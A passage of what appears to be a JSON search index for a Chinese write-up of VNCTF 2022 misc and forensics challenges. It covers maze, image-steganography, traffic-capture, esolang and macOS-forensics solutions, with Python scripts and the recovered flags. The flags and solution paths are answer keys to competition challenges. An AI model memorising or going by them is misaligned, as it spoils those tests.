\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss VNCTF{801f190737434100e7d2790bd5b0732e}","title":"BabyMaze"},{"location":"writeups/vnctf2022/#_1","text":"\u9898\u76ee \u5f88\u660e\u663e\u80fd\u53d1\u73b0\u6709\u50cf\u7d20\u683c\u70b9\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u989c\u8272\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u662f flag \u4e8e\u662f\u6253\u7b97\u63d0\u53d6\u51fa\u6240\u6709\u683c\u70b9\uff0c\u4f46\u662f\u597d\u50cf\u662f\u5206\u5757\u7684\uff0c\u4e0d\u80fd\u4e00\u6b21\u6027\u5b8c\u6574\u63d0\u53d6 \u4e8e\u662f\u5c31\u8089\u773c\u786c\u770b\uff0c\u5f97\u5230 flag\uff1a vnctf{34aE@w} \u770b\u4e86 wp\uff0c\u662f\u7f29\u653e\u5927\u5c0f\u91cd\u65b0\u91c7\u6837\uff1a from PIL import Image img = Image . open ( \"flag.png\" ) img = img . resize (( 79 , 71 ), Image . NEAREST ) img . show () \u5c31\u80fd\u6e05\u6670\u770b\u5230 flag \u4e86","title":"\u4ed4\u7ec6\u627e\u627e"},{"location":"writeups/vnctf2022/#strange-flag","text":"\u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41 \u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4 \u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c\uff1a flag `-- New\\ folder |-- New\\ folder | |-- New\\ folder | |-- New\\ folder\\ (2) | |-- New\\ folder\\ (3) | `-- New\\ folder\\ (4) `-- New\\ folder\\ (2) |-- New\\ Folder\\ (3) | |-- New\\ folder | | |-- New\\ folder | | | |-- New\\ folder | | | |-- New\\ folder(2) | | | | `-- New\\ folder | | | |-- New\\ folder(3) | | | | `-- New\\ folder | | | `-- New\\ folder(4) | | | `-- New\\ folder | | `-- New\\ folder(2) | | |-- New\\ folder | | |-- New\\ folder(2) | | | `-- New\\ folder | | |-- New\\ folder(3) | | | `-- New\\ folder | | `-- New\\ folder(4) | |-- New\\ folder(10) ... \u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784 \u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f \u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86\uff1a import os from pathlib import Path with open ( \"test\" , \"r\" ) as f : tree = f . readlines () path = Path ( \"flag\" ) last_level = - 1 for each in tree : level = each . find ( \"N\" ) // 4 if level < last_level : path = path . parent if level == last_level : path = path . parent diff = last_level - level for _ in range ( diff ): path = path . parent path = path / each . strip () . replace ( \" \\\\ \" , \"\" ) last_level = level os . makedirs ( path ) \u67e5\u4e86\u4e0b\uff0cFolders \u6709\u5de5\u5177\uff0cpip install Folders\uff0c\u7136\u540e Folders flag/\uff0c\u5f97\u5230 flag\uff1a vnctf{d23903879df57503879bcdf1efc141fe}","title":"Strange flag"},{"location":"writeups/vnctf2022/#prize-wheel","text":"\u5dee\u4e00\u70b9\uff0c\u6700\u540e\u7684\u56fe\u7247\u9006\u8fc7\u53bb\u7684\u601d\u8def\u5b8c\u5168\u9519\u4e86 \u9996\u5148\u7ed9\u4e86\u4e00\u4e2a exe\uff0c\u5f00\u59cb\u4e5f\u6ca1\u610f\u8bc6\u5230\u8fd9\u4e2a\u662f\u62bd\u5956\uff0c\u89c4\u5219\u4e5f\u6ca1\u770b\uff0c\u968f\u4fbf\u8dd1\u4e86\u8dd1\u5c31\u62ff\u5230\u4e86\u538b\u7f29\u5305\u5bc6\u7801 f6a623a2c577de3b46c079267d4bdd6e \u518d\u7ec6\u770b\u53d1\u73b0\u662f 0.5% \u7684\u6982\u7387\u80fd\u62bd\u5230\u5bc6\u7801\uff0c\u9884\u671f\u662f\u81ea\u52a8\u5316\u62bd\u5956\u6216\u8005\u9006\u5411\uff0c\u7ed3\u679c\u6211\u4e09\u6b21\u5c31\u62bd\u51fa\u6765\u4e86\uff1f\uff1f\uff08\u6b27\u5728\u4e86\u4e0d\u9700\u8981\u7684\u5730\u65b9.jpg\uff09 \u5145\u6ee1\u5e0c\u671b\u7684\u5f71\u50cf\uff08 \u538b\u7f29\u5305\u89e3\u5f00\u4e4b\u540e\u5f97\u5230\u53e6\u4e00\u4e2a\u56fe\u7247 \u9898\u76ee \u5f88\u660e\u663e\u5e94\u8be5\u662f\u4e00\u5f20\u56fe\u7247\u63d0\u53d6\u51fa\u4e86\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u86c7\u5f62\u91cd\u65b0\u6392\u5217\u5f62\u6210\u8fd9\u5f20\u56fe\u7247 \u9898\u76ee hint \u4e5f\u8bf4\u4e86\u5b58\u5728\u53ef\u4ee5\u5b9a\u4f4d\u7684\u4e1c\u897f\uff0c\u80af\u5b9a\u662f\u90a3\u4e9b\u767d\u70b9 \u4f46\u662f\u6211\u7684\u5199\u6cd5\u600e\u4e48\u6837\u90fd\u4e0d\u4f1a\u8ba9\u8fd9\u4e9b\u5bf9\u5728\u4e00\u8d77 \u6211\u7684\u60f3\u6cd5\u662f\u86c7\u5f62\u63d0\u53d6\u51fa\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\u586b\u5165 \u6211\u7684\u5199\u6cd5 from PIL import Image from tqdm import tqdm import sys img = Image . open ( \"flag.png\" ) width , height = img . size res = Image . new ( \"RGBA\" , ( 1220 , 1220 )) lst = [] for i in range ( width // 2 + 1 ): for j in range ( i , width - i ): lst . append ( img . getpixel (( i , j ))) for j in range ( i + 1 , width - i ): lst . append ( img . getpixel (( j , width - i - 1 ))) for j in range ( width - i - 2 , i , - 1 ): lst . append ( img . getpixel (( width - i - 1 , j ))) for j in range ( width - i - 1 , i , - 1 ): lst . append ( img . getpixel (( j , i ))) lst = lst [:: - 1 ] with tqdm ( total = 600 ) as pbar : for times in range ( 600 ): ptr = 0 res = Image . new ( \"RGBA\" , ( 610 , 1221 )) for j in range ( 1220 ): for i in range ( width - times ): try : res . putpixel (( i , j ), lst [ ptr ]) ptr += 1 except : pass pbar . update ( 1 ) res . save ( f \"res/- { times } .png\" ) \u6362\u4e86\u597d\u591a\u79cd\u987a\u5e8f\uff0c\u5bfc\u51fa\u4e86\u4e00\u5343\u591a\u5f20\u56fe\u7247\u4e5f\u6ca1\u6709\u957f\u5f97\u597d\u770b\u7684 \u770b\u4e86 wp\uff0c\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u4e0a\u90fd\u6709\u4e00\u4e2a\u767d\u8272\u7684\u70b9\uff0c\u8981\u65cb\u8f6c\u6bcf\u4e00\u5708\uff0c\u8ba9\u767d\u8272\u7684\u70b9\u5bf9\u6210\u4e00\u6761\u7ebf \u6240\u4ee5\u9700\u8981\u5199\u811a\u672c\u6765\u65cb\u8f6c\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u76f4\u5230\u5bf9\u9f50\uff1a \u6b63\u89e3 from PIL import Image img = Image . open ( 'flag.png' ) width , height = img . size c_x = width // 2 c_y = height // 2 for count in range ( 3 , width + 1 , 2 ): print ( count ) d = count // 2 for i in range (( count - 1 ) * 4 ): p_x = c_x - d p_y = c_y - d tmp0 = img . getpixel (( width // 2 , c_y - count // 2 )) if tmp0 [ 0 ] == 255 and tmp0 [ 1 ] == 255 and tmp0 [ 2 ] == 255 : break tmp = img . getpixel (( p_x , p_y )) for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x + 1 , p_y )))) p_x += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y + 1 )))) p_y += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x - 1 , p_y )))) p_x -= 1 for j in range ( count - 2 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y - 1 )))) p_y -= 1 img . putpixel (( p_x , p_y ), tmp ) img . save ( \"trueflag.png\" )","title":"prize wheel"},{"location":"writeups/vnctf2022/#simple-macos","text":"\u4e5f\u662f\u5dee\u4e00\u70b9\uff0c\u770b\u9519\u9690\u5199\u7684\u56fe\u7247\u6587\u4ef6\u4e86\uff0c\u505a\u4e86\u534a\u5929\u505a\u4e0d\u51fa\u6765 macOS \u53d6\u8bc1\uff0c\u7ed9\u7684\u538b\u7f29\u5305\u662f System \u548c Users \u6587\u4ef6\u5939\u7684\u4e00\u90e8\u5206 \u5168\u5c40\u641c\u7d22 flag\uff0c\u53d1\u73b0 /Users/scr1pt/Librarys/Mail/V9/.../[Gmail].mbox/\u5df2\u5220\u9664\u90ae\u4ef6.mbox/ \u4e2d\u6709\u4e00\u4e2a 603.emlx \u6587\u4ef6\uff0c\u662f\u4e00\u5c01\u5220\u9664\u6389\u7684\u90ae\u4ef6 \u7528 mac \u90ae\u4ef6\u5ba2\u6237\u7aef\u5c31\u80fd\u76f4\u63a5\u6253\u5f00\uff1a \u7136\u540e\u53bb\u627e\u8bf4\u7684 profile picture\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a\u6587\u4ef6\u91cc\u6709\u7c7b\u4f3c\u56fe\u7247\u7684 base64: /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/CryptoUserInfo.plist /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/AllUsersInfo.plist \u7b2c\u4e00\u4e2a\u662f\u82b1\u56ed\u5b9d\u5b9d\u7684\u4e00\u4e2a\u89d2\u8272 jpeg \u56fe\u7247\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4e00\u6735\u8377\u82b1\u7684 tiff \u56fe\u7247\uff0c\u7b2c\u4e09\u4e2a\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u4e4b\u540e\u6709\u4e00\u5806\u8377\u82b1\u56fe\u7247\u7684\u4e0d\u540c\u6837\u5f0f\uff08\u5927\u5c0f\u8fb9\u6846\u6587\u5b57\u4e4b\u7c7b\uff09 \u7136\u540e\u6211\u5c31\u53bb\u770b\u90a3\u4e2a tiff \u4e86\uff0c\u4ec0\u4e48\u90fd\u770b\u4e0d\u51fa\u6765 \u770b\u4e86 wp\uff0c\u662f\u5728\u7b2c\u4e00\u4e2a\u56fe\u7247\u4e2d\u9690\u85cf\u7684\u4fe1\u606f \u6587\u4ef6\u672b\u5c3e\u6709\u4e00\u4e32 flag \u7684\u7ed3\u5c3e nsllc_1s_s1MMple} \uff08\u4e0d\u592a\u786e\u5b9a\uff09 \u7136\u540e\u518d\u53bb\u6389\u8fd9\u4e00\u4e32\uff0c\u653e\u5230 Our Secret \u4e2d\u8bfb\u53d6\uff0c\u5f31\u5bc6\u7801 123456\uff0c\u5f97\u5230\u524d\u534a\u90e8\u5206 flag: VNCTF{Macos_Fore","title":"simple macos"}]}